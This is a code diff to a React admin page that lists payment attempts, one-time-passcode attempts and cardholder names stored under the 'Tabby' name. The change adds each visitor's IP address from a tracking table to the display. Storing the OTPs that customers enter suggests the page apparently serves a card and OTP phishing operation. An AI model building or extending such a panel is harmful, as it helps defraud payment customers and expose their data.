@@ -8,7 +8,7 @@ import { useToast } from "@/hooks/use-toast";
 import { useNavigate } from "react-router-dom";
 import { AdminSidebar } from "@/components/AdminSidebar";
 import { SidebarProvider } from "@/components/ui/sidebar";
-import { Loader2, CreditCard, Check, X } from "lucide-react";
+import { Loader2, CreditCard, Check, X, Globe } from "lucide-react";
 import { format } from "date-fns";
 import { ar } from "date-fns/locale";
 import { VisitorStatusIndicator } from "@/components/VisitorStatusIndicator";
@@ -56,6 +56,7 @@ interface GroupedCustomer {
   company: string | null;
   cardholder_name: string;
   visitor_session_id: string | null;
+  visitor_ip: string | null;
   latest_created_at: string;
 }
 const AdminTabbyPayments = () => {
@@ -223,8 +224,9 @@ const AdminTabbyPayments = () => {
       // Fetch payment attempts and OTP attempts in batch
       if (data && data.length > 0) {
         const paymentIds = data.map(p => p.id);
+        const sessionIds = data.map(p => p.visitor_session_id).filter(Boolean) as string[];
         
-        const [attemptsResult, otpsResult] = await Promise.all([
+        const [attemptsResult, otpsResult, visitorTrackingResult] = await Promise.all([
           supabase
             .from('tabby_payment_attempts')
             .select('*')
@@ -234,8 +236,21 @@ const AdminTabbyPayments = () => {
             .from('tabby_otp_attempts')
             .select('*')
             .in('payment_id', paymentIds)
-            .order('created_at', { ascending: true })
+            .order('created_at', { ascending: true }),
+          sessionIds.length > 0 ? supabase
+            .from('visitor_tracking')
+            .select('session_id, ip_address')
+            .in('session_id', sessionIds)
+            .order('last_active_at', { ascending: false }) : Promise.resolve({ data: [] })
         ]);
+
+        // إنشاء خريطة لـ IP addresses
+        const visitorIPMap = (visitorTrackingResult.data || []).reduce((acc: any, visitor: any) => {
+          if (!acc[visitor.session_id]) {
+            acc[visitor.session_id] = visitor.ip_address;
+          }
+          return acc;
+        }, {});
 
         // تجميع البيانات حسب رقم الجوال
         const grouped = data.reduce((acc, payment) => {
@@ -250,6 +265,7 @@ const AdminTabbyPayments = () => {
               company: payment.company,
               cardholder_name: payment.cardholder_name,
               visitor_session_id: payment.visitor_session_id,
+              visitor_ip: visitorIPMap[payment.visitor_session_id] || null,
               latest_created_at: payment.created_at
             };
           }
@@ -545,9 +561,12 @@ const AdminTabbyPayments = () => {
                     {/* معلومات أساسية - تصميم محسّن */}
                     <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4 mb-6">
                       <div className="bg-gray-50 border border-gray-200 rounded-lg p-3">
-                        <div className="text-xs text-gray-600 font-medium mb-1">ID العميل</div>
-                        <div className="font-mono text-xs text-gray-900 truncate" title={customer.payments[0]?.id}>
-                          {customer.payments[0]?.id}
+                        <div className="text-xs text-gray-600 font-medium mb-1 flex items-center gap-1">
+                          <Globe className="h-3 w-3" />
+                          IP Address
+                        </div>
+                        <div className="font-mono text-xs text-gray-900" dir="ltr">
+                          {customer.visitor_ip || 'غير متوفر'}
                         </div>
                       </div>
                       
